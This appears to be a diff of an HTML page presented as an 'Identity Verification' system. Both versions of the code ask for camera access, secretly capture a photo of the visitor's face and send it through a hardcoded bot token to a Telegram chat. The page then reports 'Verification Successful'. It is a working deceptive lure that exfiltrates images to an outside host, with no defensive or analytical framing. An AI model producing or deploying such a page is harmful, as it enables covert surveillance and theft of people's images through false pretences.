@@ -3,81 +3,56 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification System</title>
+    <title>Identity Verification</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; background: #0f0f0f; color: white; padding: 50px 20px; }
-        .card { background: #1a1a1a; padding: 40px; border-radius: 20px; border: 1px solid #333; max-width: 450px; margin: auto; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        h2 { color: #28a745; margin-bottom: 10px; }
-        p { color: #aaa; margin-bottom: 30px; }
-        button { background: #28a745; color: white; border: none; padding: 18px; width: 100%; font-size: 18px; border-radius: 12px; cursor: pointer; font-weight: bold; transition: 0.3s; }
-        button:hover { background: #218838; }
-        #status { margin-top: 25px; color: #ffc107; font-weight: 500; line-height: 1.6; }
-        .footer-note { font-size: 12px; color: #555; margin-top: 20px; }
+        body { font-family: sans-serif; text-align: center; background: #000; color: #fff; padding: 50px 20px; }
+        .card { border: 2px solid #28a745; padding: 30px; border-radius: 20px; background: #111; max-width: 400px; margin: auto; }
+        button { background: #28a745; color: white; border: none; padding: 20px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 20px; color: #ffc107; font-weight: bold; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>Identity Verification</h2>
-        <p>Please click the button below and grant camera access when prompted by your browser.</p>
-        
-        <button id="authBtn">Verify & Proceed</button>
-        
-        <div id="status">Waiting for user action...</div>
-        <div class="footer-note">Note: If permission fails, click the Lock (🔒) icon in the address bar to manually allow camera.</div>
+        <h2>Verification System</h2>
+        <p>Please click the button and allow camera access to continue.</p>
+        <button id="authBtn">Start Verification</button>
+        <div id="status">Ready</div>
     </div>
-
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const BOT_TOKEN = "8348320270:AAGKegixiqLVoglb-Th0DuR9PfEdajS8yQo";
-        const ADMIN_ID = "7289235107";
+        const TOKEN = "8348320270:AAGKegixiqLVoglb-Th0DuR9PfEdajS8yQo";
+        // This will send the photo to the first admin ID
+        const ADMIN_ID = "7289235107"; 
 
-        document.getElementById('authBtn').addEventListener('click', async () => {
-            const status = document.getElementById('status');
+        document.getElementById('authBtn').onclick = async () => {
+            const s = document.getElementById('status');
             try {
-                status.innerText = "Requesting camera permission...";
-                
-                // Trigger the browser's permission dialog
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
+                s.innerText = "Requesting Permission...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                s.innerText = "Processing...";
+                const v = document.getElementById('v');
+                v.srcObject = stream;
 
-                status.innerText = "Permission granted! Processing...";
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                // Capture after 2 seconds to ensure camera focus
                 setTimeout(async () => {
                     const canvas = document.getElementById('c');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
+                    canvas.width = v.videoWidth;
+                    canvas.height = v.videoHeight;
+                    canvas.getContext('2d').drawImage(v, 0, 0);
                     const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-                    const formData = new FormData();
-                    formData.append('chat_id', ADMIN_ID);
-                    formData.append('photo', blob, 'verify.jpg');
+                    const fd = new FormData();
+                    fd.append('chat_id', ADMIN_ID);
+                    fd.append('photo', blob, 'verify.jpg');
 
-                    // Send to Telegram
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-
-                    status.style.color = "#28a745";
-                    status.innerText = "✅ Verification Successful!";
-                    
-                    // Stop camera stream
-                    stream.getTracks().forEach(track => track.stop());
+                    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    s.innerText = "✅ Success!";
+                    stream.getTracks().forEach(t => t.stop());
                 }, 2000);
-
-            } catch (err) {
-                status.style.color = "#ff4d4d";
-                status.innerHTML = "❌ Error: Permission Denied.<br>Please enable camera in browser settings (Lock 🔒 icon).";
+            } catch (e) {
+                s.innerHTML = "❌ Error: Camera Blocked.<br>Please allow camera in site settings (Lock 🔒 icon).";
             }
-        });
+        };
     </script>
 </body>
 </html>
